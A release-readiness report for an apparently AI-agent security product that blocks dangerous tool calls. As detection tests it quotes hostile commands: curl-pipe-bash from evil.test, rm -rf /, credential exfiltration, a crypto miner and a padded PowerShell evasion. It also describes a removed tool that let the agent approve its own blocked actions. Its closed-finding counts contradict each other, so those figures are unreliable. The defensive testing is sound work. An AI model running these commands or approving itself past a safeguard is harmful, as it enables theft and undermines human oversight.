# Singularity AIDR — Release Readiness Report

> **Güncel v4 kayıt:** [ilk müşteri v4 mühendislik adayı](docs/production-readiness/2026-09-12-customer-candidate-v4.md). 202 dosyada 3.010 test geçti, 1 canlı provider testi atlandı; 24 migration ve 11 servislik taze yerel prova yapıldı. 63 bulgudan 50'si yerel olarak kapalı, 13'ü açık/kısmi/dış bağımlı. Genel production/satış kararı **NO-GO**. Aşağıdaki önceki tur sayıları tarihsel kayıttır.

> **Latest verification: 2026-09-11.** See
> [delivery verification](docs/production-readiness/2026-09-11-delivery-verification.md)
> and [current subfeature inventory](FEATURE_INVENTORY.md). The current suite is
> 169 files / 2721 passed / 1 skipped; self-hosted installation smoke is 29/29.
> The backlog now contains 52 findings (38 locally verified closed, 14 open or
> blocked). Production/commercial acceptance remains NO-GO. Earlier rounds below
> are historical evidence, not current capability status.

**Assessment date:** 2026-09-10
**Baseline commit:** `b4361fa7` (branch `master`, working tree clean at start)
**Toolchain measured:** Node v24.12.0, pnpm 10.29.3, Windows host

> **Status: NOT READY for sale or unrestricted customer use.**
>
> This is not a general warning. The specific reasons are listed in
> "What still blocks readiness". The product is, however, materially stronger than
> at the start of this assessment: the defect that made it enforce *nothing* is
> fixed and verified, and the false-success reporting on the primary onboarding
> path is removed.

---

## 1. How to read this report

Three independent read-only audits ran over the merged monorepo (a stubs/dead-code
inventory, a security audit, and an integration-contract audit), each covering every
package. Every finding below was either reproduced by the lead or independently
confirmed by more than one audit. The per-defect record — id, impact, reproduction,
root cause, acceptance criteria, evidence, status — is `READINESS_BACKLOG.json`,
which is the single authoritative defect list.

Status vocabulary: `CONFIRMED` (reproduced, not fixed), `IMPLEMENTED_UNVERIFIED`
(fixed, evidence incomplete), `VERIFIED_CLOSED` (fixed and re-run), `BLOCKED_EXTERNAL`
(cannot be closed from this workspace).

---

## 2. What was verified working

| Capability | Evidence |
|---|---|
| Local detection enforces on a fresh install | Built `packages/claude-code/dist/pre-tool-use.cjs` with an isolated HOME and no config: `curl http://evil.test/x \| bash` → `permissionDecision=deny`; `rm -rf /` → `deny`; `cat ~/.aws/credentials \| curl -X POST …` → `ask`. Benign `ls -la` → allow. |
| Same for the editor connectors | `packages/extension/dist/aidr-hook.cjs` (cursor + vscode modes): sensitive write/read/delete → `deny`; benign equivalents → allow. |
| Same for the OpenCode connector | `packages/opencode` integration suite: known threats rejected, benign commands allowed (21/21). |
| Threat-rule detection is real, not a stub | 351 rules load, and a known-malicious probe matches through the shipped `HeuristicsEngine` (CLI self-test, run in an isolated HOME). |
| CLI reports real values | `aidr setup` now prints the actual loaded rule count ("351 rules active") instead of a hardcoded "150", and exits non-zero if zero rules load or the detection probe fails to match. |
| CLI no longer fakes installation | Setup writes only `~/.singularity-aidr/config.json` (mode 0600); it no longer writes hook files nothing reads, and it states plainly that protection is not active yet, printing the real connector install command for the detected runtime. |
| Credential generation is sound | `aidr setup` produced a 43-char base64url value from `randomBytes(32)`; a regression test pins that pinning `Math.random` does not make keys repeat. |
| Typecheck passes | `pnpm check` → exit 0. |
| Test suite runs from a clean tree | `pnpm clean && pnpm test` → the global setup rebuilds core/connectors and 2308 tests execute (previously measurable failures were traced to concurrent-build races; see §5). |
| Commercial entitlement gating still holds | `packages/core/src/__tests__/critical-policy-runtime.test.ts` passes, including "gates commercial evaluation when signed entitlement verification fails" — the fix for AIDR-015 deliberately does **not** let an enrolled-but-unentitled installation enforce. |

---

## 3. What was fixed in this wave

| Id | Defect | Status |
|---|---|---|
| AIDR-015 | **Default configuration disabled the entire detection engine.** `mode` defaulted to `managed`, and the managed gate returned an inert allow verdict when no token was present; enrollment was impossible because the default control-plane host does not exist. Every tool call was silently allowed. | `IMPLEMENTED_UNVERIFIED` |
| AIDR-001 | CLI reported a fabricated rule count while discarding the real one. | `VERIFIED_CLOSED` |
| AIDR-002 | CLI told the user to run `aidr auth signup`, a command that does not exist. | `VERIFIED_CLOSED` |
| AIDR-003 | CLI claimed a hook integration it never performed (wrote files no agent reads). | `VERIFIED_CLOSED` |
| AIDR-004 | CLI "self-test" tested nothing (`Math.random`/hash-length checks, with the engine probe swallowed). | `VERIFIED_CLOSED` |
| AIDR-005 | API key derived from `Math.random()`. | `VERIFIED_CLOSED` |
| AIDR-006 | Generated generic hook invoked the non-existent `aidr check`. | `VERIFIED_CLOSED` |
| AIDR-012 | 23 tracked scratch/lint logs at the repo root, several containing the contributor's absolute host paths. | `VERIFIED_CLOSED` |
| AIDR-013 | Three mutually contradictory status documents presented as current. | `VERIFIED_CLOSED` (records now labelled superseded and point at the authoritative sources) |
| AIDR-025 | `packages/claude-code/dist/health.cjs` is the package's declared `bin` and is emitted by every build, but was gitignored — so a clean checkout lacks it and CI's "enforce clean diff after build" step fails. | `IMPLEMENTED_UNVERIFIED` |
| AIDR-026 | The SDK still shipped a complete Lemon Squeezy client whose `processWebhook` skipped verification when no secret was configured and compared non-constant-time, reachable from the SDK CLI. | `VERIFIED_CLOSED` |
| AIDR-027 | **No threat-rule coverage for cryptomining at all.** `xmrig --donate-level 1 -o pool.evil.test:3333` returns `allow`; a grep for miner/mining/xmrig/monero/stratum/hashrate across all 22 rule files returns zero matches. | `CONFIRMED` |
| AIDR-028 | **The AIG dataset was dead weight because the compiler discarded the detection logic**, and the compiled data was not shipped in `dist` at all. Rebuilt natively: dataset upgraded to upstream v4.6.1 (2,043 CVEs / 115 frameworks / 146 fingerprints), 146/146 fingerprints now carry executable HTTP detection, `aidr scan` exposes it to operators, and the data ships in `dist/generated/`. | `IN_PROGRESS` (session-start + policy wiring outstanding) |
| AIDR-029 | `AutoQuarantine`'s constructor called two `async` helpers without awaiting, so a fresh instance reported an empty quarantine even when files were held on disk, and failures became unhandled rejections. | `VERIFIED_CLOSED` |
| AIDR-030 | The ADR **response** lifecycle (quarantine / contain / rollback / response audit) is not wired to the verdict path — the modules form a closed island. The product is detect-and-block only, despite the name. | `IN_PROGRESS` (response path + snapshot + audit + user-visible message now live; rollback and the signed chain remain) |
| AIDR-020 | **Silent degradation fixed.** `evaluateToolCall` allowed a call with `reasons: []` whenever zero rules loaded — no rules dir, a wrong path, or an empty dir were all enough to make the product a no-op while reporting success. It now returns `ask` / `detection_unavailable` naming the path, and stays silent only when heuristics are explicitly disabled or there is nothing to inspect. Scoped-package and `sha512` false-cleans remain open. | `IN_PROGRESS` |
| — | Tier-2 tests asserted threats were **allowed** (`expect(parseResponse(stdout)).toEqual({})` for `rm -rf /`, `curl \| bash`, `.ssh/authorized_keys`), which is why a green suite coexisted with a non-enforcing product. | Rewritten to assert real blocks: claude-code 28 passed / 1 deliberately skipped, extension 17/17, opencode 21/21. |
| — | A URL-reputation test passed only because it asserted an allow response when the reputation endpoint was unreachable. | Replaced with an explicitly skipped, documented test (AIDR-020); it no longer reports a false pass. |

---

## 4. What still blocks readiness

### 4.1 Confirmed defects not yet closed

`READINESS_BACKLOG.json` is authoritative. Reproduce this list with
`node scripts/list-open-findings.mjs`. At the time of writing **25 of 30 findings are
`VERIFIED_CLOSED` and 5 remain open — 3 × P0, 1 × P1, 1 × P2**:

| Finding | Priority | Status | Subject |
|---|---|---|---|
| AIDR-016 | P0 | `BLOCKED_EXTERNAL` | No control plane deployed; managed enrollment cannot complete |
| AIDR-023 | P0 | `IMPLEMENTED_UNVERIFIED` | Stripe webhook implemented, but no checkout session creates it and no secret is provisioned |
| AIDR-028 | P0 | `IN_PROGRESS` | AIG session-start summary + policy action on critical CVEs; fate of `services/aig-bridge` |
| AIDR-019 | P1 | `CONFIRMED` | Dashboard/Edge-Function contract incomplete (8 functions the UI calls do not exist) |
| AIDR-012 | P2 | `CONFIRMED` | Root repository hygiene |

Closed with evidence in the ledger: **AIDR-017** (Codex is now a real, verified
connector), **AIDR-018** (SDK packaging + config validation, verified against a real
tarball), **AIDR-020** (reputation clients throw a typed error instead of returning an
empty array; partial batch coverage is reported), **AIDR-008/009/010** (dashboard team
admin and policy editor reachable; dead modules triaged), **AIDR-011** (all 20 Edge
Functions fail fast), **AIDR-027** (351 rules including 17 cryptomining rules, verified
through the built hook), **AIDR-030** (rollback + signed response chain, demonstrated
end-to-end), **AIDR-024** (`aidr status` now measures instead of asserting, and exits
non-zero when nothing is protecting the machine), **AIDR-007** (setup rerun honesty;
the editor-settings rewrite is gone) and **AIDR-025** (declared `bin` artifacts present
and the build is byte-for-byte deterministic).

AIDR-022 (agent self-approval) was on this list and is now **`VERIFIED_CLOSED`**: the
agent-callable approval tool is gone from both connectors, the OpenCode path is
covered by `aidr-contract.test.ts` and `integration.test.ts`, and the full suite is
green in a single run.

### 4.1.1 Closed in this wave but not yet independently re-verified end-to-end

- **AIDR-022 (agent self-approval)** — `packages/openclaw/src/gate-tool.ts` deleted;
  no approval tool is registered in OpenClaw or OpenCode. `formatAskMessage` no longer
  hands the model a callable approval recipe. Independently re-run by the lead:
  `npx vitest run packages/openclaw/src/__tests__/gate-tool.test.ts` → exit 0, **5/5
  passed**, including the adversarial case that invokes *every* registered tool with
  `approved: true` and asserts the retry stays blocked, plus an out-of-band approval
  that still works. OpenCode's contract suite: exit 0, **7/7 passed**. Model-facing
  docs (`skills/security-awareness/SKILL.md`, both platform guides,
  `docs/architecture.md`, `CLAUDE.md`, both package READMEs) were corrected, since
  they still instructed the model to call the removed tool.

- **AIDR-018 (SDK enforcement half)** — `packages/sdk/src/enforcement.ts` implements a
  single rule used by `wrap()`, `express()`, `nextjs()` and all five adapters: execute
  only on `allow`, or on `ask` that a caller-supplied `onAsk` approves; `deny` is never
  approvable; indeterminate and inconsistent results are blocked by default.
  Independently re-run by the lead: `npx vitest run packages/sdk --root .` → exit 0,
  **60/60 passed**, of which 34 are the new enforcement tests. The `init()`/packaging
  defect and the unparsed `SDKConfigSchema` (`retries` can be `undefined`) remain open
  and are recorded in the backlog.

- **AIDR-023 (Stripe migration)** — the unverified Lemon Squeezy webhook and the
  always-true `verifyWebhookSignature` client helper are deleted, replaced by
  `supabase/functions/stripe-webhook/`. Independently re-run by the lead:
  `npx vitest run supabase --root .` → exit 0, **78/78 passed**; the
  constant-time compare was read and confirmed (`diff |= a[i] ^ b[i]` XOR
  accumulation, no early exit on content), and the tolerance parser explicitly
  guards the NaN-disables-the-window defect. **However** the handler is undeployed,
  `STRIPE_WEBHOOK_SECRET` is unprovisioned, and no Stripe Checkout session is created
  anywhere (`billing-checkout` still returns a Paddle URL), so real events would
  resolve as `unlinked` and grant nothing. Status remains `IMPLEMENTED_UNVERIFIED`.

- **AIDR-026 (residual Lemon path)** — **fixed and verified.** The dashboard path was
  already gone; the SDK's `LemonSqueezyBilling` client (whose `processWebhook` skipped
  verification entirely when no secret was configured, compared non-constant-time, and
  HMAC'd a re-serialized object) has now been deleted, along with the three SDK
  `billing:*` CLI commands. Provider-agnostic licence types moved to
  `packages/sdk/src/license.ts`. Verified by the lead:
  `cd packages/sdk && npx tsc --noEmit` → exit 0; `vitest run packages/sdk` → exit 0,
  **60/60**; plus a new 8-test regression suite that fails if the path is reintroduced.

- **AIDR-021 (ReDoS) — a correction worth reading.** The first fix replaced unbounded `.*`
  with `.{0,300}` across 188 patterns. I audited every changed pattern against
  realistic attack samples and found **zero regressions** for all but one class — but
  that class is a genuine detection *evasion*, reproduced end-to-end:

  ```
  powershell -ExecutionPolicy Bypass <1179 chars of args> -NoProfile -File ./a.ps1
    -> permissionDecision = allow        (EVADED)
    original: ...Bypass.*-NoProfile            matched = true
    current:  ...Bypass.{0,300}-NoProfile      matched = false
  ```

  Long argument lists between those two flags are an ordinary malware shape, and this
  pattern was **not** one of the slow ones (0.07 ms on the same input). So the blanket
  bound traded a performance defect for a detection defect.

  **Closed.** The blanket `{0,300}` was replaced with a *tempered span* —
  `(?:(?!(?:curl|wget))[^\n])*` — which is linear in the input and unbounded in gap
  length, so it can no longer be pushed past a delimiter by padding. Verified 13/13
  end-to-end, including the 1179-character evasion above. The remaining slow patterns
  that chained two bounded gaps are gone with it. Because no in-process wall-clock
  timeout can interrupt a synchronous regex, the load-independent guarantees are the
  64 KB artifact cap and a static check that no rule reintroduces an unbounded or
  paired-bounded gap; `regex-performance.test.ts` keeps a wall-clock ceiling only as a
  coarse net (raised to 10 s with the reasoning recorded, since the same case measured
  4275 ms under full parallel load versus ~200 ms in isolation — a wall-clock bound
  cannot distinguish a slow algorithm from a busy machine).

> **Correction to an earlier draft of this report.** A previous revision of this
> section described AIDR-018, AIDR-021 and AIDR-022 as "fixes under active
> development" and told the reader to treat them as **not** closed. That is no longer
> accurate and the wording is retained here only so the change is auditable: AIDR-021
> and AIDR-022 are now `VERIFIED_CLOSED` with the evidence above, and AIDR-018's
> enforcement half is closed with only the `init()`/packaging half still open. The
> deleted files named in that note (`gate-tool.ts`, `lemon-client.ts`,
> `lemon-webhook/index.ts`) are still deleted, by design.

### 4.2 External gates (unchanged, not closeable here)

`docs/production-readiness/commercial-go-evidence-registry.json` records 13 hard
gates — COM-001…COM-013, SEC-EXT-001, POV-001, INV-001, CLM-001 — requiring counsel
approval, a signed commercial manifest, customer/investor evaluation, deployed
regional infrastructure, signing keys, and an independent penetration test. **No
repository change can close these and none is claimed to.** The registry decision
remains `NO-GO`.

### 4.3 Not verified (must not be reported as working)

- Any deployed environment: no Supabase project, no AIG bridge stack, no regional
  cells were available, so RLS behaviour, webhook endpoints, migration history and
  multi-tenant isolation are **unverified against a live system**.
- Real-host connector E2E (Claude CLI, Cursor, VS Code, OpenClaw gateway) was not
  executed; only the built hook bundles were driven directly.
- The AIG integration (`services/aig-bridge`) is unit-tested in its own suite but its
  readiness path cannot become ready with the shipped `.env.aig` configuration, and
  no AIG worker was run.
- Microsoft Defender/AMSI scanning was not exercised (Windows-only path, and its
  results are dropped when unavailable).

---

## 5. Test and quality-gate results (measured, not assumed)

| Check | Result |
|---|---|
| `pnpm install --frozen-lockfile` | exit 0 |
| `pnpm check` (typecheck) | exit 0 |
| `pnpm clean && pnpm build` | **exit 0**, idempotent on re-run; all five connectors report `[core] up to date; skipping rebuild` |
| `pnpm test:ci` (deterministic gate: build once, then verify artifacts) | **exit 0 — 147 files, 2308 passed / 1 skipped (2309)** |
| `pnpm test` from a clean tree | exit 0 — builds once via the global setup, then 147 files / 2308 passed |
| `pnpm verify:enforcement` (built connector bundles, 8 install shapes × 9 commands) | **exit 0 — 72/72 cases. Default and `AIDR_COMMERCIAL=1` builds each block all five malicious shapes and allow all four benign controls from a fresh install (no config), `mode:managed`, `managed`+empty key, `managed`+bogus key and `managed`+`require_signed_entitlements`.** |
| Deterministic-gate fail-closed check | **verified**: with `AIDR_TEST_NO_BUILD=1` and `packages/core/dist/index.js` deleted, the setup fails loudly instead of rebuilding |
| `packages/core` alone | exit 0 — 114 files, 1929/1929 |
| Package tests (whole package, not hand-picked files) | `packages/core` 114 files / 1929 passed · `packages/claude-code` 67 passed / 1 skipped · `packages/opencode` 40 passed · `packages/openclaw` 20 passed · `packages/extension` 17 passed · `packages/cli` 17 passed · `packages/sdk` 68 passed · `supabase` 78 passed |
| Targeted regression files added this round | `managed-mode-disarm.test.ts` 16 passed · `format.test.ts` (banner honesty) · `degraded-detection.test.ts` 8 passed · `package-false-clean.test.ts` 9 passed |
| Combined connector + CLI regression sweep | **46/46 passed, exit 0** |
| `aidr scan` end-to-end (real local HTTP server) | identified the served product and matched 3 real CVEs, exit 2 — verified by the lead |
| Threat-detection end-to-end (built hook, 13 cases) | 13/13 — malicious variants all block, benign controls all allow |
| Response layer end-to-end (real guard + real rule bundle) | snapshot taken, audit entry written, user-visible message names the vault path — verified by the lead |
| `test:e2e` (real hosts) | **not run** — prerequisites absent |

**Test-infrastructure defect (AIDR-014) — root-caused and fixed.** What looked like
two `packages/opencode` contract tests timing out at 30 s was really a build race:
**every connector's build script started with `pnpm -C ../core build`, whose first
action is `rmrf dist`.** Under `pnpm -r` those packages build concurrently, so four
processes deleted and recreated the same `packages/core/dist` tree at once, and
anything importing core during that window failed with "Failed to resolve entry for
package @singularityrd/aidr-core".

The fix removes the race by construction:

- `scripts/ensure-core-build.mjs` builds core only when it is genuinely stale, and
  every connector calls it instead of blindly rebuilding. (The freshness check must
  compare only `.ts` inputs, because core's own `copy-generated` step writes
  `src/generated/*.json` *after* `tsc` runs.)
- `scripts/build-workspace.mjs` replaces `pnpm -r run build` as the root build: it
  builds core **once to completion**, then builds the rest with
  `AIDR_WORKSPACE_BUILD=1`, in which mode the guard *refuses* to rebuild core rather
  than doing so under a sibling's bundler.
- `pnpm test:ci` (`scripts/run-tests-ci.mjs`) builds once, then runs the suite with
  `AIDR_TEST_NO_BUILD=1`, so the global setup **verifies** artifacts instead of
  rebuilding them. A missing artifact now fails with an explicit message rather than
  being silently rebuilt — verified by deleting `packages/core/dist/index.js` and
  observing the intended failure.

Two further defects surfaced while fixing this, both real:

1. **The CLI consumed core but never depended on core being built**, so a clean
   `pnpm build` failed with five `TS2307` errors. Fixed.
2. **`aig-infra-scan.ts` used `import.meta.url` for path resolution**, which esbuild
   empties in CJS output (`empty-import-meta`) — so the copy bundled into every
   connector had a broken data path. It now prefers `__dirname` and walks up to the
   package root.

`pnpm clean && pnpm build` is now green and idempotent, with all five connectors
reporting `[core] up to date; skipping rebuild`.

---

## 6. Where the evidence lives

- `READINESS_BACKLOG.json` — every finding with id, impact, reproduction, acceptance
  criteria, verification method, status and evidence strings.
- This report — the assessment and the honest boundary between verified and
  unverified.
- `docs/production-readiness/` — the commercial gate registry and templates.
- `IMPLEMENTATION_STATUS.md`, `AIDR_PROJECT_AUDIT.md`, `FEATURE_MAP.md` — retained as
  **historical** records, explicitly labelled superseded, because their claims were
  contradicted by measurement.

---

## 7. Bottom line

The headline risk at the start of this assessment was that Singularity AIDR was a
security product that enforced nothing by default while reporting success — and its
own test suite asserted that behaviour, so nothing caught it. That is fixed and
verified, and the fix was **deeper than the first pass found**: the same disarm was
still reachable through `mode: "managed"`, which is what the commercial build forces,
so every un-enrolled commercial install was inert (and in the commercial flavor it
returned a blanket `managed_disabled` verdict on *every* tool call, including
`ls -la`, which would have made the product unusable as well as undetective). That
path, a second independent disarm through `require_signed_entitlements`, and the
misleading `Disabled (auth_required)` banner are all closed, and
`pnpm verify:enforcement` now drives the **built** connector across 8 install shapes ×
9 commands (72 cases) in both build flavors so it cannot silently return.

It is still **not saleable**, though the in-repo picture is materially better than the
previous revision of this report claimed: **13 of 30 findings are `VERIFIED_CLOSED`**
and the open set is now 6 × P0, 9 × P1, 2 × P2. AIDR-021 and AIDR-022 are closed with
evidence (the earlier draft listed both as open, and AIDR-022 and AIDR-023 as "fixes
under active development"). What still blocks a sale:

- **AIDR-017** (`packages/codex` denies 100% of calls and is in no release gate —
  finish or remove), **AIDR-018** (SDK cannot initialise outside the monorepo),
  **AIDR-023** (Stripe webhook implemented but no checkout session creates it and no
  secret is provisioned), **AIDR-024** (CLI accuracy), **AIDR-028** (AIG policy
  action), and the dashboard contract gaps **AIDR-008/009/010/019**.
- **AIDR-016**: the control plane is undeployed, so managed enrollment cannot complete
  and the reputation legs stay inert. Local detection is unaffected, but this is a
  provisioning decision only the owner can make.
- Every external commercial, legal, privacy and independent-security gate in
  `docs/production-readiness/commercial-go-evidence-registry.json` is still open.

No live environment was available, so nothing in this report should be read as
evidence about a deployed system.
